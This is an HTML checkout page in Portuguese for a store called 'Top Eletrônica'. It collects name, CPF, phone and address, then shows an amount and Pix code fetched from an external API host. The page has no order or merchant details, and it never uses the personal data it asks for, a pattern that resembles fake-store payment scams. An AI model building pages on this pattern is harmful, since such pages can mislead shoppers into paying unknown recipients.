<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Pagamento Pix | Top Eletrônica</title>

<style>
body{
  margin:0;
  font-family:system-ui;
  background:#f5f6f8;
  color:#333
}
.hidden{display:none}

/* HEADER */
.header{
  background:#fff;
  padding:18px;
  text-align:center;
  border-bottom:1px solid #e5e5e5
}
.header h2{margin:0;font-size:18px}

/* CONTAINER */
.container{
  max-width:420px;
  margin:30px auto;
  background:#fff;
  border-radius:14px;
  box-shadow:0 10px 30px rgba(0,0,0,.08);
  overflow:hidden
}
.section{padding:20px}

/* INPUTS */
input{
  width:100%;
  padding:12px;
  margin-top:10px;
  font-size:14px;
  border:1px solid #ddd;
  border-radius:8px
}
input:focus{
  outline:none;
  border-color:#2db36c
}

/* BUTTON */
button{
  width:100%;
  padding:14px;
  margin-top:16px;
  font-size:16px;
  border:0;
  border-radius:10px;
  background:#2db36c;
  color:#fff;
  cursor:pointer
}

/* PIX */
.valor{
  font-size:22px;
  font-weight:700;
  margin:8px 0
}
.code{
  background:#f3f4f6;
  padding:12px;
  border-radius:8px;
  font-size:12px;
  word-break:break-all;
  margin-top:8px
}

/* MODAL */
.modal{
  position:fixed;
  inset:0;
  background:rgba(0,0,0,.45);
  display:none;
  place-items:center;
  z-index:999
}
.modal .box{
  background:#fff;
  border-radius:14px;
  padding:20px;
  max-width:340px;
  text-align:center
}
.modal ol{
  text-align:left;
  font-size:14px;
  padding-left:18px
}

/* FOOTER */
.footer{
  font-size:12px;
  color:#777;
  text-align:center;
  padding:16px
}
</style>
</head>

<body>

<!-- FORMULÁRIO -->
<div id="formulario" class="container">
  <div class="header">
    <h2>Identificação</h2>
  </div>

  <div class="section">
    <input id="nome" placeholder="Nome completo">
    <input id="cpf" placeholder="CPF">
    <input id="telefone" placeholder="Telefone">
    <input id="cep" placeholder="CEP">
    <input id="endereco" placeholder="Endereço completo">

    <button onclick="continuar()">Continuar para pagamento</button>
  </div>
</div>

<!-- PAGAMENTO PIX -->
<div id="pagamento" class="container hidden">
  <div class="header">
    <h2 id="titulo">Pagamento via Pix</h2>
    <p id="subtitulo" style="font-size:13px;color:#666"></p>
  </div>

  <div class="section">
    <div>Valor a pagar:</div>
    <div class="valor" id="valor">--</div>

    <div style="margin-top:10px">Código Pix:</div>
    <div class="code" id="codigo">Carregando...</div>

    <button id="copyBtn">Copiar código</button>
    <p id="validade" style="font-size:12px;color:#777;margin-top:6px"></p>
  </div>
</div>

<!-- MODAL INSTRUÇÕES -->
<div class="modal" id="pixModal">
  <div class="box">
    <h3>✅ Código copiado</h3>
    <p>Siga os passos:</p>
    <ol>
      <li>Abra o app do seu banco</li>
      <li>Pix → Copia e Cola</li>
      <li>Cole o código</li>
      <li>Confirme o pagamento</li>
    </ol>
    <button onclick="fecharModal()">Entendi</button>
  </div>
</div>

<div class="footer">
  Top Eletrônica © 2026<br>
  Pagamento processado via Pix
</div>

<script>
const API='https://pix-site-api.onrender.com/api/pix';
let PIX='';

async function carregarPix(){
  const r=await fetch(API,{cache:'no-store'});
  const d=await r.json();

  titulo.innerText=d.titulo;
  subtitulo.innerText=d.subtitulo;
  valor.innerText=d.valor;
  codigo.innerText=d.codigo;
  validade.innerText=d.validade;

  PIX=d.codigo;
}
carregarPix();

function continuar(){
  const campos=[nome,cpf,telefone,cep,endereco];
  if(campos.some(c=>!c.value.trim())){
    alert('Preencha todos os campos');
    return;
  }
  formulario.classList.add('hidden');
  pagamento.classList.remove('hidden');
}

document.getElementById('copyBtn').onclick=()=>{
  navigator.clipboard.writeText(PIX).then(()=>{
    pixModal.style.display='grid';
  });
};

function fecharModal(){
  pixModal.style.display='none';
}
</script>

</body>
</html>
